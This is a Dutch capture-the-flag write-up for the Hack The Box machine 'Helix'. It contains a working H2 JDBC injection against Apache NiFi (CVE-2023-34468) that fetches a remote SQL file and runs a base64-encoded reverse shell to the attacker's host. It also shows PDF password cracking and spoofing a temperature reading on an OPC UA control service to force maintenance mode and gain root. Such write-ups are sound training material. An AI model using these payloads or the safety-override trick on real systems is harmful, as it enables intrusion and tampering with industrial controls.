# Helix

Op de company page komen we niet veel tegen. Met `ffuf` geen interessante
subpagina's en op de pagina zelf is geen interactie mogelijk. We komen wel een
extra subdomain tegen genaamd `flow.helix.htb`.

## Flow.helix.htb

Op `flow.helix.htb` draait een tool genaamd _Nifi_ wat lijkt op iets om flows te
definiëren. De volledige versie is `nifi-1.21.0-RC2`. In deze versie lijkt een
exploit te zitten (CVE-2023-34468) waarmee command execution mogelijk is. Dit
lijkt te zitten in de database URL wat ook een `h2` url kan zijn waar `INIT=..`
mogelijk is.

### POC

In Nifi heb ik een extra database toegevoegd met deze connectie url:

```
jdbc:h2:mem:freckles;INIT=RUNSCRIPT FROM 'http://10.10.17.2:9001/evil.sql'
```

Dit haalt een sequal bestand op bij mij waarin het volgende staat:

```sql
CREATE TABLE test (
     id INT NOT NULL
);

CREATE TRIGGER TRIG_JS BEFORE INSERT ON TEST as $$//javascript
java.lang.Runtime.getRuntime().exec('bash -c {echo,L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE3LjIvOTAwMiAwPiYx}|{base64,-d}|{bash,-i}')
$$;

INSERT INTO TEST VALUES (1);
```

> _Het bash script hier zet een reverse shell op_

### Shell

Met de revshell heb ik toegang tot de `nifi` user die zelf niks mag. Op de box
hebben de volgende users een login shell:

```
root:x:0:0:root:/root:/bin/bash
operator:x:1001:1001::/home/operator:/bin/bash
```

> _HTB kennende moeten we dus richting de operator user_

In `NiFi` kom ik de volgende onderdelen tegen waar we waarschijnlijk iets mee
kunnen:

- In `flow.json` (was gz dus `gunzip`) staat een password met
  - `enc{dcd7740e6bc394689894cc46d8803a1833713d18c778a0f5d8c8db2b0a61e54a49293afc9ea186410e271a26f031476d5a94}`
- `nifi.properties` staat
  - `key:TUHh+YHA30zmdlcA8xq/elNBLPkO03Nl`
  - `algorithm:NIFI_PBKDF2_AES_GCM_256`

### Reverse engineering

Omdat ik geen zin heb om alles te reverse engineren eerst verder gaan kijken en
nadat ik wat beter naar de output ben gaan kijken van:

```bash
grep -rnw ./ -ie 'KEY'
```

kom ik een private key tegen in `support-bundles/operator_id_ed25519.bak`.
Waarom geen idee maar kijken of ik hiermee SSH toegang heb.

# Operator

Met de key heb ik toegang tot de `operator` user en in de home folder kom ik een
_control systems diagram.png_ tegen en een _operator.pdf_ waar een wachtwoord op
zit.

## 4840

In het diagram staat een helix server op poort 4840. Tijd voor een port forward.
Hier draait iets op wat met een `opc.tcp://` verbinding werkt (_ook uit het
diagram gehaald_) wat iets te maken heeft met het besturen van PLC's :/

Met [opcua-commander](https://github.com/node-opcua/opcua-commander)
uiteindelijk verbinding gemaakt. Nu kan de `operator` user een sudo command
uitvoeren maar alleen als we in `MAINTENANCE` mode zijn. De truc is dus om in
maintenance mode te komen.

## PDF

Handleidingen zijn er om te lezen dus ik heb met `pdf2john` de hash van de PDF
gepakt en deze door hashcat gegooid en hiermee krijgen we het wachtwoord
`operator1`. In de documentatie staat wel een interessante tekst namelijk:

> _Om maintenance mode te activeren moet:_
>
> - Mode omgezet worden naar `MAINTENANCE`
> - `TestOverride` op `true` staan
> - En de temperatuur moet boven de 295 graden celcius zijn.

De eerste twee zijn makkelijk aan te passen en de tweede kunnen we met
`CalibrationOffset` aanpassen. Eenmaal gedaan kunnen we het sudo script weer
draaien. En we zijn nu daadwerkelijk in maintenance mode en krijgen een root
shell!
